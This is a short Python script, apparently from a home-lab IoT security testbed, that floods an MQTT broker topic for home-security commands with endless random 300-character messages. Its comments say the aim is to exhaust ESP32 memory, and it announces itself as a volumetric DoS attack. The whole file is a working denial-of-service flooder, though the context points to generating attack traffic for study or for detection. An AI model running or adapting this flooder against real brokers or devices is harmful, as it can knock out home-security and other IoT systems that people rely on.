import paho.mqtt.client as mqtt
import time
import random
import string

# ==========================================
# CONFIGURATION
# ==========================================
BROKER_IP = "localhost" 
TARGET_TOPIC = "shtsp/home/security/cmd"

# Create a large junk payload (300 characters) to exhaust ESP32 memory
def get_junk_payload():
    return ''.join(random.choice(string.ascii_letters) for _ in range(300))

client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, "Hacker_DoS_Node")
client.connect(BROKER_IP, 1883)
client.loop_start() # Start background networking thread

print("🔥 LAUNCHING VOLUMETRIC DoS ATTACK...")
print("Targeting ESP32 Command Topic. Watch the PPS in the Collector window!")

try:
    count = 0
    while True:
        # Publish as fast as the laptop can handle
        client.publish(TARGET_TOPIC, f"MALICIOUS_DATA_{count}_{get_junk_payload()}")
        
        count += 1
        if count % 500 == 0:
            print(f"🚀 Sent {count} attack packets...")
            
except KeyboardInterrupt:
    print("\n🛑 Attack Stopped by User.")
    client.loop_stop()
    client.disconnect()